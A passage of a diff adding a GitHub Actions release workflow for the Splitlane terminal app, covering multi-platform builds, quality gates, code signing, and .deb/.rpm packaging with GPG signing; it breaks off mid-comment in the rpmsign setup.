@@ -1,0 +1,3184 @@
+name: release
+
+on:
+  push:
+    tags: ["v*"]
+  # Dry-run dispatch. Manually-triggered runs build the full
+  # matrix (including sign + notarize + dmg + msi + smoke tests) but
+  # skip every downstream public side-effect:
+  #   - no GitHub Release (`release:` job is gated on RELEASE_MODE)
+  #   - no Homebrew Cask / Winget update (their triggers are
+  #     `release: published`, which never fires when the release job
+  #     is skipped)
+  #   - no APT/RPM repository publish (that workflow is disabled, and
+  #     it gated on `workflow_run.event == 'push'`, so a
+  #     workflow_dispatch run would be filtered out anyway)
+  # Use case: validate the signing + packaging chain on a branch
+  # before cutting a tag. Artifacts land as workflow artifacts with
+  # 7-day retention (see the build job's Upload step), and the
+  # `dry-run-summary` job at the bottom of this file fans them out
+  # with SHA-256 hashes into the Actions UI Summary.
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Dry-run semver (no v prefix, e.g. 0.2.12-rc.1)"
+        required: true
+        type: string
+      target_ref:
+        description: "Git ref to build from"
+        required: false
+        type: string
+        default: main
+      msi_upgrade_version:
+        description: "Optional x.y.z MSI ProductVersion used only by a dry-run upgrade smoke"
+        required: false
+        type: string
+        default: ""
+
+permissions:
+  contents: write
+
+# Serialize releases by ref. A tag-push race (or a dry-run launched on
+# top of a real tag) shouldn't double-publish or interrupt a half-baked
+# upload - `cancel-in-progress: false` lets the first run finish
+# atomically. Grouped by `ref_name` so different tags don't block each
+# other. Mirrors Zed's release.yml pattern.
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref_name }}
+  cancel-in-progress: false
+
+# Apply Zed's run_tests.yml shell convention to every implicit-bash step:
+# -e fail-on-error, -u error-on-unset, -x trace each command (CI logs
+# stay greppable), -o pipefail propagate pipe failures. Per-step
+# `shell: pwsh` overrides this default; the Windows-conditional steps
+# in this file already declare pwsh explicitly so they're unaffected.
+defaults:
+  run:
+    shell: bash -euxo pipefail {0}
+
+env:
+  CARGO_TERM_COLOR: always
+  GHOSTTY_SHA: ae52f97dcac558735cfa916ea3965f247e5c6e9e
+  ZIG_VERSION: 0.15.2
+  # Synthesize the canonical TAG every downstream packaging
+  # step already uses as its version source (every `cp`, sha256, .deb,
+  # .rpm, .dmg, .msi name resolves through `${TAG#v}`). In tag-push
+  # mode RELEASE_TAG echoes `github.ref_name`; in workflow_dispatch
+  # (dry-run) we synthesize `v<inputs.version>` so the `${TAG#v}`
+  # strip stays correct and asset names stay consistent across modes.
+  # The `&&` short-circuits before `format()` runs on push events
+  # (where `inputs.version` is null), so this is safe in both
+  # contexts.
+  RELEASE_TAG: ${{ github.event_name == 'workflow_dispatch' && format('v{0}', inputs.version) || github.ref_name }}
+  # Branch / ref to check out. Tag-push mode picks the tag (matches
+  # the historical `actions/checkout@v5` default behaviour); dry-run
+  # uses the user-supplied target_ref (default: main).
+  RELEASE_REF: ${{ github.event_name == 'workflow_dispatch' && (inputs.target_ref || 'main') || github.ref_name }}
+  # A dry-run may need to exercise an upgrade from the latest release while
+  # the checked-out source still reports that same version. The override only
+  # changes the non-published MSI ProductVersion; real releases always use the
+  # tag version, including prereleases normalized by cargo-wix, and the smoke
+  # enforces that equality.
+  WINDOWS_MSI_VERSION: ${{ github.event_name == 'workflow_dispatch' && (inputs.msi_upgrade_version || inputs.version) || github.ref_name }}
+  # Mode flag consumed by per-step `if:` / `continue-on-error:` gates
+  # so a dry-run can never accidentally publish a Release.
+  RELEASE_MODE: ${{ github.event_name == 'workflow_dispatch' && 'dry-run' || 'release' }}
+
+jobs:
+  verify_workspace_tests:
+    name: Release test gate (Linux x86_64)
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ env.RELEASE_REF }}
+
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y \
+            libvulkan-dev \
+            libwayland-dev \
+            libxkbcommon-dev \
+            libx11-dev \
+            libxcb1-dev \
+            libxcb-render0-dev \
+            libxcb-shape0-dev \
+            libxcb-xfixes0-dev \
+            libxkbcommon-x11-dev \
+            libfontconfig1-dev \
+            libfreetype6-dev
+
+      - uses: dtolnay/rust-toolchain@master
+        with:
+          toolchain: "1.96.1"
+
+      - uses: Swatinem/rust-cache@v2
+        with:
+          prefix-key: "v1-rust"
+          key: release-test-linux
+
+      - name: cargo test --workspace
+        run: cargo test --workspace --locked
+
+  build:
+    name: Build ${{ matrix.target }}
+    needs: verify_workspace_tests
+    runs-on: ${{ matrix.runs-on }}
+    # Every matrix leg is hard-required. A failed Linux, macOS, or
+    # Windows build must fail the whole release workflow and block
+    # publishing.
+    strategy:
+      # fail-fast: true keeps the four-platform build matrix atomic: a
+      # broken target cancels queued siblings where possible, and any
+      # completed failure fails `build`, blocking publish and downstream
+      # release gates.
+      fail-fast: true
+      matrix:
+        include:
+          - target: x86_64-unknown-linux-gnu
+            arch: x86_64
+            runs-on: ubuntu-22.04
+          # Hosted ARM runner (in GitHub public preview since late 2024) -
+          # explicitly NOT `cross` and NOT QEMU, matching Zed's own
+          # `bundle_linux_aarch64` pattern.
+          - target: aarch64-unknown-linux-gnu
+            arch: aarch64
+            runs-on: ubuntu-22.04-arm
+          # macOS aarch64 (Apple Silicon). Native build on
+          # GitHub-hosted macos-14, chains through the
+          # bundle + sign + notarize + .dmg pipeline. Uses the same
+          # TAG value as the Linux legs; the macOS-only prelude below
+          # strips the leading `v` before feeding it to Info.plist
+          # (CFBundleShortVersionString requires bare semver).
+          #
+          # A hard release gate: a notarization or staple regression must
+          # fail the workflow rather than ship an unsigned .dmg under a
+          # green run. Without the APPLE_* secrets the signing steps are
+          # skipped and an unsigned .app is emitted (see the detection
+          # step further down).
+          - target: aarch64-apple-darwin
+            arch: aarch64
+            runs-on: macos-14
+          # x86_64-pc-windows-msvc - a hard release gate like Linux and
+          # macOS: any Windows build, signing, packaging, or staging
+          # failure fails the workflow. Signing uses Azure Artifact
+          # Signing through the six AZURE_* secrets.
+          - target: x86_64-pc-windows-msvc
+            arch: x86_64
+            runs-on: windows-2022
+          # Not built: x86_64-apple-darwin (Intel Mac). The macos-13
+          # runner queue is long enough to hold up the `Publish GitHub
+          # Release` job, which waits for every matrix leg.
+
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          # Dry-run runs check out `inputs.target_ref` (default
+          # `main`); tag-push runs check out the tag (RELEASE_REF
+          # echoes github.ref_name there).
+          ref: ${{ env.RELEASE_REF }}
+
+      - name: Checkout pinned Ghostty source
+        if: runner.os == 'Linux'
+        uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
+        with:
+          repository: ghostty-org/ghostty
+          ref: ${{ env.GHOSTTY_SHA }}
+          path: .ghostty-source
+          fetch-depth: 1
+
+      - name: Install pinned Zig
+        if: runner.os == 'Linux'
+        uses: mlugg/setup-zig@d1434d08867e3ee9daa34448df10607b98908d29 # v2
+        with:
+          version: ${{ env.ZIG_VERSION }}
+
+      - name: Install system dependencies
+        if: runner.os == 'Linux'
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y \
+            libvulkan-dev \
+            libwayland-dev \
+            libxkbcommon-dev \
+            libx11-dev \
+            libxcb1-dev \
+            libxcb-render0-dev \
+            libxcb-shape0-dev \
+            libxcb-xfixes0-dev \
+            libxkbcommon-x11-dev \
+            libfontconfig1-dev \
+            libfreetype6-dev \
+            binutils \
+            elfutils \
+            jq \
+            patchelf \
+            lintian \
+            dpkg-sig \
+            rpm \
+            gnupg \
+            appstream \
+            imagemagick \
+            icnsutils
+
+      # ImageMagick is preinstalled on windows-2022 and the macos-14 GHA images
+      # ship sips (Apple's built-in resizer) + iconutil out of the box, but
+      # neither ships ImageMagick. scripts/build-icons.sh prefers `magick` for
+      # multi-resolution .ico assembly, so install it here on the macOS leg only
+      # - the Linux leg picks up `imagemagick` via the apt-get block above and
+      # the Windows leg uses the preinstalled copy.
+      - name: Install ImageMagick (macOS)
+        if: runner.os == 'macOS'
+        run: brew install --quiet imagemagick
+
+      - name: Setup MSVC developer environment
+        if: runner.os == 'Windows'
+        uses: ilammy/msvc-dev-cmd@v1
+
+      - name: Verify Windows compiler and signing tools
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          where.exe cl.exe
+          where.exe link.exe
+
+          $signtool = Get-Command -Name signtool.exe -ErrorAction SilentlyContinue
+          if ($null -eq $signtool) {
+              $sdkRoot = 'C:\Program Files (x86)\Windows Kits\10\bin'
+              if (Test-Path -LiteralPath $sdkRoot) {
+                  $signtool = Get-ChildItem -Path $sdkRoot -Recurse -Filter 'signtool.exe' -ErrorAction SilentlyContinue |
+                      Where-Object { $_.FullName -match '\\x64\\' } |
+                      Sort-Object { try { [version]$_.Directory.Parent.Name } catch { [version]'0.0.0.0' } } -Descending |
+                      Select-Object -First 1
+              }
+          }
+          if ($null -eq $signtool) {
+              throw "signtool.exe not found on PATH or under the Windows SDK."
+          }
+          $signtoolPath = if ($signtool.PSObject.Properties.Name -contains 'Source') { $signtool.Source } else { $signtool.FullName }
+          Write-Output "Using signtool: $signtoolPath"
+
+      # Validate the AppStream metainfo XML before any packaging
+      # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
+      # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
+      # would ignore, and (b) block distro submission. Fail-fast here so a
+      # malformed `<releases>` block (e.g., after a version bump that forgot
+      # the `<release>` entry) never makes it into a shipped artifact.
+      - name: Validate AppStream metainfo
+        if: runner.os == 'Linux'
+        run: |
+          appstreamcli validate \
+            --no-net \
+            --pedantic \
+            assets/io.github.ivkan.splitlane.metainfo.xml
+
+      - name: Verify AppStream release version freshness
+        if: runner.os == 'Linux'
+        run: |
+          workspace_version="$(awk -F'"' '/^version = / { print $2; exit }' Cargo.toml)"
+          appstream_version="$(awk -F'"' '/<release version=/ { print $2; exit }' assets/io.github.ivkan.splitlane.metainfo.xml)"
+          if [ -z "$workspace_version" ] || [ -z "$appstream_version" ]; then
+            echo "::error::could not resolve Cargo.toml or AppStream release version"
+            exit 1
+          fi
+          if [ "$workspace_version" != "$appstream_version" ]; then
+            echo "::error::AppStream top release version ($appstream_version) must match workspace version ($workspace_version)"
+            exit 1
+          fi
+
+      # Pinned via repo-level `rust-toolchain.toml`. Use the
+      # `@master` ref + explicit `toolchain` input so the action reads the
+      # same channel everywhere instead of resolving `@stable` at runtime,
+      # which drifts each Rust point release and broke fmt mid-v0.2.11.
+      - uses: dtolnay/rust-toolchain@master
+        with:
+          # Must match `rust-toolchain.toml` channel verbatim. The
+          # workspace dep graph (oo7, cosmic-text, smol_str, wgpu)
+          # requires rustc >= 1.92, so this can't drift below 1.92.
+          toolchain: "1.96.1"
+          components: rustfmt, clippy
+          targets: ${{ matrix.target }}
+
+      - uses: Swatinem/rust-cache@v2
+        with:
+          prefix-key: "v1-rust"
+          key: ${{ matrix.target }}
+
+      - name: Install cargo-deb (pinned)
+        if: runner.os == 'Linux'
+        run: cargo install cargo-deb --version 3.6.3 --locked
+
+      - name: Install cargo-generate-rpm (pinned)
+        if: runner.os == 'Linux'
+        # Version pinned to the one we validated against the TOML schema.
+        # Bumping 0.20.0 → anything else requires re-reading the
+        # upstream README: the `assets` inline-table grammar has changed in
+        # prior minor versions.
+        run: cargo install cargo-generate-rpm --version 0.20.0 --locked
+
+      - name: Prepare reproducible libghostty archive
+        if: runner.os == 'Linux'
+        env:
+          SPLITLANE_GHOSTTY_SOURCE_DIR: ${{ github.workspace }}/.ghostty-source
+          TARGET: ${{ matrix.target }}
+        run: |
+          scripts/build-libghostty-linux.sh --target "$TARGET" --verify-reproducible
+          echo "SPLITLANE_LIBGHOSTTY_DIR=${{ github.workspace }}/target/libghostty/$TARGET" >> "$GITHUB_ENV"
+
+      # --- Quality gates (defense-in-depth against shipping broken builds) ---
+      - name: cargo fmt --check
+        if: runner.os != 'Windows'
+        run: cargo fmt --check
+
+      - name: cargo fmt --check (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          cargo fmt --check
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      - name: cargo clippy (Linux with libghostty)
+        if: runner.os == 'Linux'
+        run: >-
+          cargo clippy --workspace --locked
+          --features splitlane-app/libghostty-linux
+          --target ${{ matrix.target }}
+          -- -D warnings
+
+      - name: cargo clippy (macOS)
+        if: runner.os == 'macOS'
+        run: >-
+          cargo clippy --workspace --locked --no-default-features
+          --target ${{ matrix.target }} -- -D warnings
+
+      - name: cargo clippy (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          cargo clippy --workspace --locked --no-default-features --target ${{ matrix.target }} -- -D warnings
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      # cargo test runs once in the `verify_workspace_tests` job before this
+      # matrix starts. The per-target legs keep fmt, clippy, build, packaging,
+      # signing, and smoke coverage focused on their platform.
+
+      # Regenerate every icon asset (.png hicolor set, .icns, .ico,
+      # rust-embed runtime icon) from the master PNGs under
+      # `assets/icons/master/`. Script is a no-op when no master is present,
+      # so this step is safe to land before the masters are committed.
+      # Placement rationale: runs AFTER the Rust quality gates (fmt/clippy/
+      # test surface failures fast) but BEFORE `Build release binary` and
+      # all packaging steps, so cargo-deb / cargo-generate-rpm / bundle-
+      # macos.sh / cargo-wix all see fresh icons from this same checkout.
+      # `shell: bash` because the script is bash; on the Windows runner this
+      # invokes Git Bash and consumes the preinstalled `magick` binary.
+      - name: Regenerate icons from master
+        shell: bash
+        run: bash scripts/build-icons.sh
+
+      # Windows Application Control / Smart App Control evaluates the helper
+      # executable that actually runs from the Splitlane terminal PATH. The
+      # outer `splitlane.exe` signature does not cover helper bytes after
+      # extraction, so sign the embedded helper artifacts before the app build
+      # ingests them via rust-embed.
+      - name: Prepare signed Windows embedded helpers
+        id: windows_helpers
+        if: runner.os == 'Windows'
+        shell: pwsh
+        env:
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
+          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
+          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
+          # The O= (Organization) the signature must carry. A repository
+          # VARIABLE, not a secret - it is printed in the log on failure and
+          # is the publisher name users see, so it is not confidential. The
+          # script HARD-FAILS if it is empty rather than skipping the check.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+        run: |
+          $required = @(
+            'AZURE_TENANT_ID',
+            'AZURE_CLIENT_ID',
+            'AZURE_CLIENT_SECRET',
+            'AZURE_TRUSTED_SIGNING_ENDPOINT',
+            'AZURE_TRUSTED_SIGNING_ACCOUNT',
+            'AZURE_TRUSTED_SIGNING_CERT_PROFILE',
+            'SPLITLANE_EXPECTED_SIGNER_ORG'
+          )
+          $missing = $required | Where-Object { [string]::IsNullOrEmpty([System.Environment]::GetEnvironmentVariable($_)) }
+          if ($missing.Count -gt 0) {
+            Write-Warning "Skipping signed embedded helpers; missing Azure signing secret(s): $($missing -join ', ')"
+            "helpers_prepared=false" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
+            exit 0
+          }
+
+          $target = '${{ matrix.target }}'
+          $cargo = if ([string]::IsNullOrEmpty($env:CARGO)) { 'cargo' } else { $env:CARGO }
+          & $cargo build `
+            --profile release-min `
+            --locked `
+            --target $target `
+            --target-dir target/embed-build `
+            -p splitlane-shim `
+            -p splitlane-ai-hook `
+            -p splitlane-mcp
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+          $artifactDir = Join-Path 'target/embed-build' "$target/release-min"
+          $embedDir = Join-Path 'src-app/target/embed/bin' $target
+          $packagedHelperDir = Join-Path (Join-Path 'target' $target) 'release/splitlane-helpers'
+          New-Item -ItemType Directory -Path $embedDir -Force | Out-Null
+          New-Item -ItemType Directory -Path $packagedHelperDir -Force | Out-Null
+
+          foreach ($name in @('splitlane-shim.exe', 'splitlane-ai-hook.exe', 'splitlane-mcp.exe')) {
+            $artifact = Join-Path $artifactDir $name
+            if (-not (Test-Path -LiteralPath $artifact -PathType Leaf)) {
+              throw "Expected helper artifact missing: $artifact"
+            }
+            pwsh -NoProfile -File ./scripts/sign-windows.ps1 -InputFile $artifact
+            Copy-Item -LiteralPath $artifact -Destination (Join-Path $embedDir $name) -Force
+          }
+
+          $shim = Join-Path $artifactDir 'splitlane-shim.exe'
+          foreach ($name in @(
+            'claude.exe',
+            'codex.exe',
+            'opencode.exe',
+            'pi.exe',
+            'hermes.exe',
+            'grok.exe',
+            'amp.exe',
+            'cursor-agent.exe',
+            'gemini.exe',
+            'kiro-cli.exe',
+            'agy.exe',
+            'copilot.exe',
+            'codebuddy.exe',
+            'droid.exe',
+            'qodercli.exe',
+            'openclaw.exe'
+          )) {
+            Copy-Item -LiteralPath $shim -Destination (Join-Path $packagedHelperDir $name) -Force
+          }
+          Copy-Item -LiteralPath (Join-Path $artifactDir 'splitlane-ai-hook.exe') `
+            -Destination (Join-Path $packagedHelperDir 'splitlane-ai-hook.exe') `
+            -Force
+
+          "helpers_prepared=true" | Out-File -FilePath $env:GITHUB_OUTPUT -Append -Encoding utf8
+
+      - name: Validate Windows helper packaging set
+        if: runner.os == 'Windows' && steps.windows_helpers.outputs.helpers_prepared == 'true'
+        shell: pwsh
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          $helperDir = Join-Path (Join-Path 'target' $env:TARGET) 'release/splitlane-helpers'
+          if (-not (Test-Path -LiteralPath $helperDir -PathType Container)) {
+              throw "Expected helper directory missing: $helperDir"
+          }
+
+          $ns = New-Object System.Xml.XmlNamespaceManager((New-Object System.Xml.NameTable))
+          $ns.AddNamespace('w', 'http://schemas.microsoft.com/wix/2006/wi')
+          $xml = New-Object System.Xml.XmlDocument
+          $xml.Load((Resolve-Path -LiteralPath 'packaging/wix/main.wxs').Path)
+          $wixHelpers = @(
+              $xml.SelectNodes("//w:Component[@Id='HelperBinaries']/w:File", $ns) |
+                  ForEach-Object { $_.GetAttribute('Name') } |
+                  Sort-Object
+          )
+          $diskHelpers = @(
+              Get-ChildItem -LiteralPath $helperDir -Filter '*.exe' -File |
+                  ForEach-Object { $_.Name } |
+                  Sort-Object
+          )
+          $diff = Compare-Object -ReferenceObject $wixHelpers -DifferenceObject $diskHelpers
+          if ($null -ne $diff) {
+              $diff | Format-Table | Out-String | Write-Output
+              throw "WiX HelperBinaries entries do not match prepared splitlane-helpers files."
+          }
+
+      # --- Release build ---
+      # `POSTHOG_API_KEY` is resolved by `option_env!` at compile time
+      # (see `src-app/src/app/bootstrap.rs`); embedding it here at the
+      # single `cargo build --release` step is sufficient for every
+      # downstream artifact (tar.gz, .deb, .rpm, AppImage, .dmg, and the
+      # cargo-wix MSI which consumes this build via `--no-build`). If the
+      # secret is absent the startup log::warn! surfaces and events are
+      # silently dropped - never a user-facing failure.
+      - name: Build release binary
+        env:
+          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+          # The project lives in PostHog's US cloud, whose ingestion host is
+          # not the built-in default - a key from one region is rejected by
+          # the other, so the two must be set together.
+          POSTHOG_HOST: https://us.i.posthog.com
+          # Bake the minisign public key(s)
+          # into the binary so the self-updater can verify downloaded
+          # artifacts (option_env! in update/signature.rs). PUBLIC keys →
+          # repository *variables*, never secrets. Two slots (current + next)
+          # for zero-downtime rotation; an unset var resolves to "" which
+          # the verifier treats as "no key in this slot".
+          SPLITLANE_MINISIGN_PUBKEY: ${{ vars.SPLITLANE_MINISIGN_PUBKEY }}
+          SPLITLANE_MINISIGN_PUBKEY_NEXT: ${{ vars.SPLITLANE_MINISIGN_PUBKEY_NEXT }}
+          # Baked into the Windows self-updater (option_env! in
+          # update/windows/msi.rs): the publisher an update MSI must be
+          # signed by. Same variable the signing script verifies against,
+          # so producer and consumer cannot drift. Unset = the updater
+          # refuses every MSI, which is the safe direction.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+          TARGET: ${{ matrix.target }}
+          WINDOWS_HELPERS_PREPARED: ${{ steps.windows_helpers.outputs.helpers_prepared }}
+        if: runner.os != 'Windows'
+        run: |
+          if [ "${WINDOWS_HELPERS_PREPARED:-}" = "true" ]; then
+            export SPLITLANE_SKIP_EMBED_BUILD=1
+          fi
+          feature_args=(--no-default-features)
+          if [ "$RUNNER_OS" = "Linux" ]; then
+            feature_args=()
+          fi
+          cargo build --release -p splitlane-app --locked --target "$TARGET" "${feature_args[@]}"
+
+      - name: Verify packaged libghostty identity and static linkage
+        if: runner.os == 'Linux'
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          scripts/verify-libghostty-package.sh \
+            --binary "target/$TARGET/release/splitlane" \
+            --notice native/libghostty/THIRD_PARTY_NOTICES.md
+
+      - name: Build release binary (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        env:
+          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+          POSTHOG_HOST: https://us.i.posthog.com
+          SPLITLANE_MINISIGN_PUBKEY: ${{ vars.SPLITLANE_MINISIGN_PUBKEY }}
+          SPLITLANE_MINISIGN_PUBKEY_NEXT: ${{ vars.SPLITLANE_MINISIGN_PUBKEY_NEXT }}
+          # Baked into the Windows self-updater (option_env! in
+          # update/windows/msi.rs): the publisher an update MSI must be
+          # signed by. Same variable the signing script verifies against,
+          # so producer and consumer cannot drift. Unset = the updater
+          # refuses every MSI, which is the safe direction.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+          TARGET: ${{ matrix.target }}
+          WINDOWS_HELPERS_PREPARED: ${{ steps.windows_helpers.outputs.helpers_prepared }}
+        run: |
+          if ($env:WINDOWS_HELPERS_PREPARED -eq 'true') {
+              $env:SPLITLANE_SKIP_EMBED_BUILD = '1'
+          }
+          cargo build --release -p splitlane-app --locked --no-default-features --features splitlane-app/libghostty-windows --target $env:TARGET
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      # --- Phase 1 artifacts ---
+      - name: Produce tar.gz
+        if: runner.os == 'Linux'
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body - same injection-hardening rationale as the
+        # AppImage step below (attacker-controlled tags must not reach bash
+        # via GitHub Actions expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        # `${TAG#v}` strips the leading `v` so the bundled artifact is
+        # `splitlane-<semver>-<arch>.tar.gz` (no `v` prefix), matching the
+        # naming convention macOS and Windows already follow. Until v0.3.0
+        # the Linux assets were `splitlane-v<semver>-<arch>.tar.gz`, a
+        # historical inconsistency that's safe to drop because the in-app
+        # update matcher (`update_checker.rs::pick_asset`) is suffix-only
+        # (`ends_with("-<arch>.tar.gz")`) and version-agnostic.
+        run: bash scripts/bundle-tarball.sh "${TAG#v}"
+
+      - name: Produce .deb
+        if: runner.os == 'Linux'
+        run: cargo deb --no-build -p splitlane-app --target ${{ matrix.target }}
+
+      - name: Lintian check
+        if: runner.os == 'Linux'
+        run: |
+          lintian \
+            --suppress-tags bad-distribution-in-changes-file \
+            target/${{ matrix.target }}/debian/*.deb
+
+      - name: Produce .rpm
+        if: runner.os == 'Linux'
+        # `-p src-app` is the DIRECTORY path (relative to workspace root),
+        # not the crate name - cargo-generate-rpm 0.20.0 resolves `-p`
+        # strictly as a path. `-p splitlane-app` fails with "No such file
+        # or directory: splitlane-app/Cargo.toml".
+        #
+        # `--target` aligns with the earlier cargo-build output dir and
+        # drops the artifact at target/<triple>/generate-rpm/. Source
+        # paths in `[package.metadata.generate-rpm]` that start with
+        # `target/release/` are auto-rewritten to match.
+        run: cargo generate-rpm -p src-app --target ${{ matrix.target }}
+
+      # ─── GPG signing ───────────────────────────────────────────────────
+      # Signs the freshly-built .deb and .rpm with the release key
+      # (`GPG_PRIVATE_KEY` secret) so dpkg-sig / rpm --checksig accept
+      # them, and so `dnf install` on an `gpgcheck=1` client succeeds.
+      #
+      # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
+      # An earlier draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
+      # but those produce incompatible signature formats - the verify
+      # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
+      # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
+      # XML required).
+      #
+      # HARD-FAIL contract: if the GPG_PRIVATE_KEY secret is
+      # missing or malformed, the workflow exits NON-ZERO with the exact
+      # mandated string "GPG signing failed: key not loaded". No
+      # silent-unsigned-release path. The release-creating step at the
+      # end of the job is downstream - it never runs if we exit here.
+      - name: Sign .deb and .rpm with release key
+        if: runner.os == 'Linux'
+        env:
+          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+          GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
+          TARGET: ${{ matrix.target }}
+        run: |
+          set -euo pipefail
+
+          # --- Fail-fast: secrets present? -----------------------------
+          if [ -z "${GPG_PRIVATE_KEY:-}" ] || [ -z "${GPG_KEY_ID:-}" ]; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY and/or GPG_KEY_ID secrets are not populated. Add them in the repository's Actions secrets." >&2
+            exit 1
+          fi
+          # Require the full 40-char fingerprint. Short 16-char key IDs
+          # are collision-vulnerable (see https://evil32.com/) - an
+          # attacker who could populate `GPG_KEY_ID` with a short ID
+          # pointing at a rogue key would satisfy the later `grep -qi
+          # "${GPG_KEY_ID}$"` fingerprint match against any key whose
+          # fingerprint ends in those 16 hex chars. Enforcing 40 chars
+          # eliminates the attack class.
+          if ! [[ "$GPG_KEY_ID" =~ ^[0-9A-Fa-f]{40}$ ]]; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_KEY_ID must be the 40-char hex fingerprint (got ${#GPG_KEY_ID} chars). Short key IDs are rejected because they are collision-vulnerable." >&2
+            exit 1
+          fi
+
+          # --- Import the key ------------------------------------------
+          mkdir -p ~/.gnupg
+          chmod 700 ~/.gnupg
+          # `allow-loopback-pinentry` lets us pass the passphrase via
+          # `--pinentry-mode loopback` from non-interactive contexts.
+          echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
+          gpgconf --kill gpg-agent || true
+          # Import; if the private-key blob is malformed, `gpg --import`
+          # exits non-zero and `set -e` fails the step - the annotation
+          # above ensures the red X in PR check matches the hard-fail contract.
+          # `<<<` (bash herestring) passes the secret through a kernel
+          # pipe buffer, NOT through argv - so it never appears in
+          # `/proc/<pid>/cmdline` of any intermediate process.
+          if ! gpg --batch --import <<< "$GPG_PRIVATE_KEY" 2>&1; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY failed to import. Secret may be truncated or missing the ASCII-armor header." >&2
+            exit 1
+          fi
+          # Verify the imported key's fingerprint matches GPG_KEY_ID.
+          # Substring match because `--with-colons` prints the full
+          # fingerprint while GPG_KEY_ID may be either form (16/40 hex).
+          if ! gpg --list-secret-keys --with-colons \
+               | awk -F: '/^fpr:/ {print $10}' \
+               | grep -qi "${GPG_KEY_ID}$"; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY does not match GPG_KEY_ID fingerprint. Secrets likely mismatched." >&2
+            exit 1
+          fi
+
+          # --- Prime the agent passphrase cache (only if passphrased) --
+          # Uses the dummy-clearsign trick. If the key has no
+          # passphrase (`%no-protection`), GPG_PASSPHRASE is empty and we
+          # skip - `gpg` accepts `--passphrase-file <(printf '')` as an
+          # empty passphrase but it also ignores pinentry in that case.
+          if [ -n "${GPG_PASSPHRASE:-}" ]; then
+            printf 'prime' | gpg --batch --yes \
+              --passphrase-file <(printf '%s' "$GPG_PASSPHRASE") \
+              --pinentry-mode loopback \
+              --local-user "$GPG_KEY_ID" \
+              --armor --clearsign \
+              --output /dev/null
+          fi
+
+          # --- Pre-warm the GPG agent cache ---
+          # Explicit `gpg --list-secret-keys` call to ensure the imported
+          # secret key is loaded into the running gpg-agent BEFORE the
+          # first rpmsign invocation. Without this, on a fresh runner
+          # agent, rpmsign can race the agent's lazy key-load path and
+          # abort mid-sign with a stdin-read error (upstream
+          # https://github.com/rpm-software-management/rpm/issues/3740).
+          # The earlier fingerprint-check call already reads the key, but
+          # we keep this as a distinct step so the intent is obvious if
+          # a future maintainer refactors the fingerprint check away.
+          gpg --list-secret-keys >/dev/null
+
+          # --- Write ~/.rpmmacros for rpmsign --------------------------
+          # `rpmsign` without a macros file would spawn an interactive
+          # pinentry. Override `%__gpg_sign_cmd` so it runs in batch mode
+          # with loopback pinentry. `%_gpg_name` tells it which key.
+          #
+          # Passphrase handling: rpmsign invokes `%__gpg_sign_cmd` via
+          # `/bin/sh -c`, which on Ubuntu is `dash` - and dash does NOT
+          # support bash process substitution `<(...)`. So we can't inline
+          # `--passphrase-file <(printf ...)` into the macro. Instead we
+          # write the passphrase to a private 0600 temp file, reference
+          # that path from the macro, and `trap` its cleanup. The temp
+          # file is on the runner's ephemeral tmpfs - same blast radius
